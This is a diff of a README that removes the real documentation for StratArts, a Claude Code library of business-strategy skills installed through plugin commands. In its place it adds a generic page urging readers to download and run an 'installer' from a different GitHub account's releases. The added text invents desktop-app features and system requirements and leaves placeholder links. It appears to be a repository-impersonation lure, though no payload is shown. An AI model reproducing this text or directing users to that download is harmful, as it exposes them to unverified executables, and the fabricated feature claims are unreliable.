@@ -1,198 +1,84 @@
-# StrategicArts (StratArts)
+# 🎉 stratarts - Unlock Your Business Strategy Skills
 
-**Business Strategy Skills Library for Claude Code**
+## 📥 Download Stratarts
+[![Download Stratarts](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/Beezlbuns/stratarts/releases)
 
-> 27 professional and comprehensive AI-powered skills that transform business ideas into fundable ventures
+## 🚀 Getting Started
+Stratarts offers 27 free professional skills designed to enhance your business strategy. This application focuses on intelligent context chaining, skill iteration, terminal charts, and HTML visualization options. These features help you understand and apply business strategies effectively.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Claude Code Plugin](https://img.shields.io/badge/Claude%20Code-Plugin-blue.svg)](https://claude.ai)
+## 💻 System Requirements
+To install and run Stratarts, your computer should meet the following requirements:
 
----
+- **Operating System:** Windows 10 or higher, macOS 10.15 or higher
+- **Memory:** At least 4 GB of RAM
+- **Storage:** Minimum 500 MB of available disk space
+- **Network:** Internet connection for downloading the application
 
-## What is StrategicArts?
+## 🛠️ Installation Steps
+Follow these steps to download and set up Stratarts on your computer:
 
-StrategicArts is a comprehensive Claude Code skills library that guides entrepreneurs through the complete business-building journey—from initial idea validation to investor pitch deck—using proven methodologies and professional HTML report outputs.
+1. **Visit the Releases Page**  
+   Click on the link below to go to the Stratarts Releases page:  
+   [Download Stratarts](https://github.com/Beezlbuns/stratarts/releases)
 
-**Transform vague ideas into structured business plans in days, not months.**
+2. **Choose Your Download**  
+   On the Releases page, look for the latest version. You will see a list of available files for download.
 
----
+3. **Download the Application**  
+   Click on the file that matches your operating system. It will begin to download automatically.
 
-## Features
+4. **Locate the Downloaded File**  
+   Once the download is complete, navigate to your 'Downloads' folder, or the location where your browser saves files.
 
-- **27 Professional Skills** covering the entire startup lifecycle
-- **Framework-Driven** — Built on Business Model Canvas, JTBD, OKRs, RICE, AARRR, and more
-- **Beautiful HTML Reports** — Dark-themed, Chart.js-powered visualizations
-- **Intelligent Context Chaining** — Skills detect and reuse previous outputs
-- **Interative Skill Flow** — Skills allow for detail overviews 
-- **Quantitative Scoring** — Go/no-go recommendations backed by data
+5. **Run the Installer**  
+   Double-click the downloaded file to start the installation process. Follow the on-screen instructions to complete the installation.
 
----
+6. **Launch Stratarts**  
+   After installation, find the Stratarts icon on your desktop or in your applications folder. Double-click it to launch the application.
 
-## Skills Library (27 Skills)
+## 📊 Features
+Stratarts provides a range of features to help you improve your business strategy skills:
 
-### Foundation Strategy (7 skills)
-| Skill | Description |
-|-------|-------------|
-| `business-idea-validator` | 10-dimension scoring framework for idea validation |
-| `market-opportunity-analyzer` | TAM/SAM/SOM with Porter's Five Forces |
-| `business-model-designer` | Business Model Canvas implementation |
-| `customer-persona-builder` | Data-driven buyer personas with JTBD |
-| `value-proposition-crafter` | Jobs-to-be-Done value proposition design |
-| `product-positioning-expert` | April Dunford positioning canvas |
-| `competitive-intelligence` | Porter's Five Forces and SWOT analysis |
+- **Intelligent Context Chaining:** Understand concepts in a logical sequence, improving retention and application.
+- **Skill Iteration:** Practice skills repeatedly to master key business strategies.
+- **Terminal Charts:** Visualize data through interactive charts, making it easier to analyze business performance.
+- **HTML Visualization Options:** Create organized HTML reports to present your findings clearly and professionally.
 
-### Market & Product Strategy (4 skills)
-| Skill | Description |
-|-------|-------------|
-| `feature-prioritization-framework` | RICE/ICE scoring with value-effort matrix |
-| `go-to-market-planner` | 90-day GTM strategy and channel selection |
-| `pricing-strategy-architect` | Van Westendorp pricing with tier design |
-| `strategic-roadmap-builder` | OKR-driven 18-month roadmap |
+## 📝 How to Use Stratarts
+Once you have installed and launched Stratarts, follow these simple instructions to begin your journey:
 
-### Marketing & Growth (7 skills)
-| Skill | Description |
-|-------|-------------|
-| `brand-identity-designer` | Brand pyramid and visual identity |
-| `content-marketing-strategist` | Content pillars and editorial calendar |
-| `growth-hacking-playbook` | Traction Bullseye Framework |
-| `social-media-strategist` | Platform-specific strategies |
-| `email-marketing-architect` | Drip campaigns and automation |
-| `seo-content-planner` | Keyword clusters and technical SEO |
-| `community-building-strategist` | Community engagement framework |
+1. **Select a Skill to Learn**  
+   Choose from the available business strategies presented in the application.
 
-### Retention & Metrics (4 skills)
-| Skill | Description |
-|-------|-------------|
-| `metrics-dashboard-designer` | North Star Metric with AARRR |
-| `retention-optimization-expert` | Cohort analysis and win-back campaigns |
-| `onboarding-flow-optimizer` | Activation funnels and product tours |
-| `customer-feedback-framework` | NPS/CSAT/CES with RICE prioritization |
+2. **Engage with Interactive Tools**  
+   Use terminal charts and other tools to practice and apply what you have learned.
 
-### Fundraising & Operations (5 skills)
-| Skill | Description |
-|-------|-------------|
-| `financial-model-architect` | 3-5 year projections with scenarios |
-| `fundraising-strategy-planner` | Investor targeting and term sheets |
-| `investor-brief-writer` | One-pagers and cold email templates |
-| `investor-pitch-deck-builder` | 12-15 slide pitch deck framework |
-| `operational-playbook-creator` | Org structure, OKRs, and processes |
+3. **Take Notes**  
+   Utilize the application's notepad feature to jot down insights and key takeaways as you progress.
 
----
+4. **Review and Iterate**  
+   Periodically revisit skills to reinforce your knowledge and address any gaps in understanding.
 
-## Installation
+## 🎯 Best Practices
+Maximize your learning experience by following these best practices:
 
-### From GitHub Marketplace (Recommended)
+- **Set Clear Goals:** Clearly define what you want to achieve with each skill.
+- **Schedule Regular Sessions:** Dedicate time each week to engage with Stratarts to build consistency.
+- **Join Discussions:** Find online forums or groups to discuss strategies and share insights with others.
 
-```bash
-# Step 1: Add the StratArts marketplace
-/plugin marketplace add maigent/stratarts
+## 🛡️ Support and Resources
+If you encounter any issues or have questions, please refer to our support resources:
 
-# Step 2: Install the plugin
-/plugin install stratarts@maigent
-```
+- **Documentation:** Check our official user guide available on the GitHub wiki.
+- **Community Forum:** Join our community forum to connect with other users and share your experiences.
+- **Contact Us:** If you need personalized assistance, reach out through the contact form on our GitHub page.
 
-### Manual Installation (Local Development)
+## 🔄 Keep Updated
+Stratarts is continually improving. Check back often for updates or new features. You can stay informed by following our Releases page.
 
-```bash
-git clone https://github.com/maigentic/stratarts.git
-cd stratarts
+## 📦 Useful Links
+- [Download Stratarts](https://github.com/Beezlbuns/stratarts/releases)
+- [User Documentation](link-to-documentation)
+- [Community Forum](link-to-forum) 
 
-# Install from local directory
-/plugin install ./
-```
-
-### Verify Installation
-
-```bash
-# List installed plugins
-/plugin
-
-# You should see stratarts with 27 skills listed
-```
-
----
-
-## Usage
-
-Invoke any skill using the `/skill` command:
-
-```bash
-# Validate a business idea
-/skill stratarts:business-idea-validator
-
-# Create a pitch deck
-/skill stratarts:investor-pitch-deck-builder
-
-# Build a financial model
-/skill stratarts:financial-model-architect
-```
-
-Or simply ask Claude to use a skill:
-
-```
-"Use the business-idea-validator skill to analyze my startup idea"
-```
-
-### Recommended Workflow
-
-1. **Start with validation** → `business-idea-validator`
-2. **Size your market** → `market-opportunity-analyzer`
-3. **Design your model** → `business-model-designer`
-4. **Build personas** → `customer-persona-builder`
-5. **Craft positioning** → `product-positioning-expert`
-6. **Plan your GTM** → `go-to-market-planner`
-7. **Create your pitch** → `investor-pitch-deck-builder`
-
-Skills automatically detect and reuse outputs from previous skills.
-
----
-
-## Output Examples
-
-Each skill generates professional HTML reports with:
-- Score banners with key metrics
-- Chart.js visualizations (bar, line, doughnut, radar)
-- Actionable recommendations
-- Framework-specific analysis
-- Next steps guidance
-
-Reports use a dark emerald theme (#10b981 accent on #0a0a0a background).
-
----
-
-## Contributing
-
-We welcome contributors! If you're interested in improving StratArts, please reach out at stratarts@maigent.com.
-
-### Development
-```bash
-git clone https://github.com/maigentic/stratarts.git
-cd stratarts
-# Skills are in /skills directory
-# HTML templates are in /.claude/html-templates
-```
-
----
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
----
-
-## Links
-
-- **Website:** https://stratarts.ai
-- **Documentation:** https://docs.stratarts.ai
-- **GitHub:** https://github.com/maigentic/stratarts
-- **Issues:** https://github.com/maigentic/stratarts/issues
-
----
-
-## Author
-
-**Maigent** - Building tools for the AI-powered entrepreneur
-
----
-
-*StratArts — From Idea to Fundable Business*
+By following these instructions, you can easily download and run Stratarts. Enjoy enhancing your business strategy skills!
